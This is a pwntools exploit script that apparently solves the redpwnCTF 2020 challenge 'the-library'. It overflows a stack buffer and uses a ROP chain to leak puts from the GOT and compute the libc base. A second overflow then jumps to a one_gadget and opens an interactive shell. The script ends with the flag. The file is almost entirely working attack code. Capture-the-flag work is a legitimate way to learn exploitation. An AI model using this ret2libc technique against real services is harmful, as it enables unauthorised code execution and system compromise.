from pwn import *
elf = ELF('./the-library', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = elf.process()
p = remote('2020.redpwnc.tf', 31350)
payload = b''.join([
    cyclic(0x10+8),
    p64(0x0000000000400733),
    p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(elf.sym['main']),
])
p.sendlineafter(b'name?', payload)
libc.address = u64(p.recvline_contains('\x7f').decode('latin-1').ljust(8, '\x00')) - libc.sym['puts']
log.info(f'libc leak 0x{libc.address:x}')
payload = b''.join([
    cyclic(0x10+8),
    p64(libc.address + 0x10a38c),
    b'\x00'*0x100
])
p.sendlineafter(b'name?', payload)
p.interactive()
# flag{jump_1nt0_th3_l1brary}